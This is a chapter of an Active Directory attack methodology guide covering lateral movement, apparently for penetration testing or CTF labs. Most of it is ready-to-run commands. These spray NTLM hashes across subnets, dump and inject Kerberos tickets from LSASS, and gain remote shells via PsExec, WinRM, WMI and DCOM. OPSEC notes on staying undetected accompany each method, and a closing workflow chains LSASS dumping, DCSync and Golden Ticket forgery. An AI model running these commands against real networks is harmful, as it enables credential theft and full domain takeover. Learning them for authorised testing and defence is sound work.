# Phase 5: Lateral Movement

> You have valid credentials (password or hash) and local admin on a target. Move to it and pivot.

---

## Table of Contents
1. [Pass-the-Hash (PtH)](#1-pass-the-hash-pth)
2. [Pass-the-Ticket (PtT)](#2-pass-the-ticket-ptt)
3. [Overpass-the-Hash](#3-overpass-the-hash)
4. [Remote Execution Methods](#4-remote-execution-methods)
5. [WMI / DCOM](#5-wmi--dcom)
6. [Finding Lateral Movement Paths](#6-finding-lateral-movement-paths)

---

## Decision Tree

```
You have a credential. Lateral move how?
│
├── NTLM hash? → Pass-the-Hash (any tool with -H flag)
├── Kerberos ticket? → Pass-the-Ticket (export KRB5CCNAME)
├── Password and Kerberos enforced? → Overpass-the-Hash (hash → TGT)
│
├── Target port 5985/86 (WinRM) → Evil-WinRM (preferred, stealthier)
├── Target port 445 (SMB) → PsExec / SMBexec / WMIexec
└── Need stealth → WMIexec or DCOM
```

---

## 1. Pass-the-Hash (PtH)

**Concept**: NTLM authentication accepts the user's NTLM hash directly — you don't need the plaintext password. Discovered by Hernan Ochoa (2008). Still effective today against any service that allows NTLM auth.

```bash
# NetExec — fastest way to spray a hash
nxc smb 10.10.10.0/24 -u administrator -H 8d969eef6ecad3c29a3a629280e686cf

# Local-auth flag for local SAM accounts (not domain)
nxc smb 10.10.10.0/24 -u administrator -H <hash> --local-auth

# Impacket — pretty much every tool accepts -hashes
psexec.py lab.local/administrator@10.10.10.50 -hashes :8d969eef6ecad3c29a3a629280e686cf
wmiexec.py lab.local/administrator@10.10.10.50 -hashes :8d969eef6ecad3c29a3a629280e686cf
smbexec.py lab.local/administrator@10.10.10.50 -hashes :8d969eef6ecad3c29a3a629280e686cf

# Evil-WinRM with hash
evil-winrm -i 10.10.10.50 -u administrator -H 8d969eef6ecad3c29a3a629280e686cf
```

Note the `:` before the hash in Impacket — the format is `LMhash:NTLMhash`. The empty LM hash `aad3b435b51404eeaad3b435b51404ee` is padding; just leave it blank with leading `:`.

🔴 **OPSEC**: PtH generates normal Event 4624 LogonType 3. Detection relies on **anomaly** patterns (admin account from a workstation it never logs in from, etc.).

**Defense Note**: Modern AD with **Credential Guard** + tiered admin model + **Protected Users** group makes PtH much harder. Defender for Identity has direct "Suspected pass-the-hash" alerts based on logon patterns.

---

## 2. Pass-the-Ticket (PtT)

**Concept**: Inject a Kerberos ticket (TGT or TGS) into your session. The OS uses it for any subsequent service auth — no password or hash needed.

### From Windows
```powershell
# Export tickets from current LSASS (need debug priv)
.\Rubeus.exe dump /nowrap                 # base64 tickets to stdout
sekurlsa::tickets /export                  # Mimikatz, writes .kirbi files

# Inject a ticket
.\Rubeus.exe ptt /ticket:<base64>
kerberos::ptt ticket.kirbi                # Mimikatz

# Verify
klist
```

### From Linux
```bash
# Request a TGT for a user (using their password or hash)
getTGT.py lab.local/jdoe:Password1 -dc-ip 10.10.10.10
# Outputs: jdoe.ccache

# Set the ticket cache
export KRB5CCNAME=$(pwd)/jdoe.ccache

# Use Kerberos auth (-k -no-pass for Impacket; -k for nxc/evil-winrm)
secretsdump.py -k -no-pass dc01.lab.local
smbclient //dc01.lab.local/C\$ -k -n
nxc smb dc01.lab.local -k --use-kcache
evil-winrm -i dc01.lab.local -u administrator -r lab.local  # uses KRB5CCNAME
```

🟢 **OPSEC**: Stealthier than PtH because the DC sees a normal Kerberos service ticket request — not anomalous unless the ticket itself is malformed (forged).

---

## 3. Overpass-the-Hash

**Concept**: You have an NTLM hash and want to use Kerberos (because PtH is blocked or Kerberos is preferred). Use the hash as the long-term key to request a TGT.

```powershell
# Mimikatz — spawns new shell with Kerberos auth as target
sekurlsa::pth /user:administrator /domain:lab.local /ntlm:<hash> /run:powershell.exe

# Rubeus — explicit TGT request
.\Rubeus.exe asktgt /user:administrator /rc4:<NTLMhash> /domain:lab.local \
  /dc:dc01.lab.local /nowrap /ptt
```

```bash
# Linux — getTGT also works with -hashes
getTGT.py -hashes :<NTLMhash> lab.local/administrator -dc-ip 10.10.10.10
export KRB5CCNAME=administrator.ccache
```

🟡 **OPSEC**: TGT request uses RC4 if you only have the NTLM hash (no AES key). Generates a 4768 with encryption type 0x17, which can stand out vs. a domain that's AES-only.

---

## 4. Remote Execution Methods

### PsExec (port 445, creates a service)
```bash
psexec.py lab.local/administrator:'Password1'@10.10.10.50
psexec.py lab.local/administrator@10.10.10.50 -hashes :<NTLMhash>
```

🔴 **OPSEC**: Creates a service on the target (Event 7045) and uploads a binary to `ADMIN$`. Returns a SYSTEM shell. Loud, but reliable. Every EDR fingerprints PsExec patterns.

### SMBExec (port 445, no binary upload)
```bash
smbexec.py lab.local/administrator:Password1@10.10.10.50
```

🟡 **OPSEC**: Still creates a service but no binary drop. Slightly stealthier than PsExec.

### WinRM / Evil-WinRM (port 5985/5986)
```bash
# Password
evil-winrm -i 10.10.10.50 -u administrator -p Password1

# Hash
evil-winrm -i 10.10.10.50 -u administrator -H <NTLMhash>

# Kerberos ticket
export KRB5CCNAME=administrator.ccache
evil-winrm -i dc01.lab.local -u administrator -r lab.local
```

🟡 **OPSEC**: Generates Event 4624 LogonType 3. WinRM has its own log (`Microsoft-Windows-WinRM/Operational`). Much cleaner than PsExec — preferred when WinRM is available.

### atexec / Scheduled Task (port 445)
```bash
atexec.py lab.local/administrator:Password1@10.10.10.50 'whoami'
```

🟡 **OPSEC**: Creates and deletes a scheduled task. Logged as Event 4698/4702.

---

## 5. WMI / DCOM

### WMI (port 135 + dynamic)
```bash
# Impacket
wmiexec.py lab.local/administrator:Password1@10.10.10.50
wmiexec.py lab.local/administrator@10.10.10.50 -hashes :<hash> 'whoami /priv'
```

```powershell
# From Windows session
$cred = Get-Credential
Invoke-WmiMethod -ComputerName ws01 -Credential $cred -Class Win32_Process \
  -Name Create -ArgumentList "powershell -enc <base64>"
```

🟢 **OPSEC**: No service created. WMI activity is logged but rarely alerted at default audit. Some EDRs do flag `wmiexec.py`'s specific shell pattern (using `cmd.exe /Q /c` with `\\target\ADMIN$\__1234567`).

### DCOM
```powershell
# MMC20.Application
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "ws01"))
$com.Document.ActiveView.ExecuteShellCommand("cmd", $null, "/c calc", "7")

# ShellWindows / ShellBrowserWindow — alternative DCOM objects
```

```bash
# Impacket dcomexec
dcomexec.py lab.local/administrator:Password1@10.10.10.50
```

🟢 **OPSEC**: Very stealthy compared to PsExec, but the specific DCOM objects used are well-known and EDRs increasingly fingerprint them.

---

## 6. Finding Lateral Movement Paths

### Where do my creds give me local admin?
```bash
# Spray creds across the network — (Pwn3d!) marker means local admin
nxc smb 10.10.10.0/24 -u administrator -H <NTLMhash>
# Or check a single host
nxc smb 10.10.10.50 -u jdoe -p Password1
```

### Where are privileged users logged in (hunt the DA)?
```bash
nxc smb 10.10.10.0/24 -u jdoe -p Password1 --loggedon-users
nxc smb 10.10.10.0/24 -u jdoe -p Password1 --sessions
```

```powershell
# PowerView
Invoke-UserHunter -GroupName "Domain Admins" -CheckAccess
Get-NetSession -ComputerName ws01
```

### Service reachability
```powershell
# Is WinRM open?
Test-WsMan -ComputerName ws01

# Quick SMB test
Test-NetConnection ws01 -Port 445
```

---

## Pivot Workflow Example (typical CTF)

1. Spray creds → `(Pwn3d!)` on workstation `WS02` for user `jdoe`.
2. Evil-WinRM to WS02 as jdoe.
3. Dump LSASS (see `07-domain-dominance.md`) → find DA's logged-on session → harvest credentials.
4. Use new DA creds to PsExec to DC.
5. DCSync the krbtgt hash → forge Golden Ticket for persistence.

---

## Next Step

You have local admin somewhere → time to dump credentials and pivot up the chain → **Phase 7: Domain Dominance** (`07-domain-dominance.md`)

If you don't have local admin yet but have a juicy ACL → **Phase 6: Privilege Escalation** (`06-privesc.md`)
